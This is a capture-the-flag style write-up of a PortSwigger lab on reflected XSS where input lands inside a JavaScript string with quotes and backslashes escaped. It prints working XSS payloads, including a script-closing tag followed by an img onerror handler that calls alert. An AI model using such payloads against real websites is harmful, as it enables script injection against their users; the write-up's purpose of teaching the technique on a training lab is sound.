# Reflected XSS into a JavaScript string with single quote and backslash escaped

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped), you'll learn: Reflected XSS into a JavaScript string with single quote and backslash escaped! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab contains a [reflected cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-21/images/Pasted%20image%2020230101033828.png)

In here, we can see there is a search box.

Let's try to search something:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-21/images/Pasted%20image%2020230101034058.png)

As you can see, our input is reflected to the web page.

**View source page:**
```html
<section class=search>
    <form action=/ method=GET>
        <input type=text placeholder='Search the blog...' name=search>
        <button type=submit class=button>Search</button>
    </form>
</section>
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

In here, **the `searchTerms` is inside the `document.write` JavaScript function's string.**

**Let's try to escape it:**
```html
>'+'<script>alert(document.domain)</script>'
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-21/images/Pasted%20image%2020230101034812.png)

However, **it escaped `"`.**

**How about `\`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-21/images/Pasted%20image%2020230101035043.png)

Same.

**Which means we need to use event handlers:**
```html
</script><img src=errorpls onerror=alert(document.domain)>
```

**Hence the application's JavaScript will be:**
```html
<script>
    var searchTerms = 'test';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='</script><img src=errorpls onerror=alert(document.domain)>
```

Let's try it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-21/images/Pasted%20image%2020230101035458.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Cross-Site-Scripting/XSS-21/images/Pasted%20image%2020230101035506.png)

Nice!

# What we've learned:

1. Reflected XSS into a JavaScript string with single quote and backslash escaped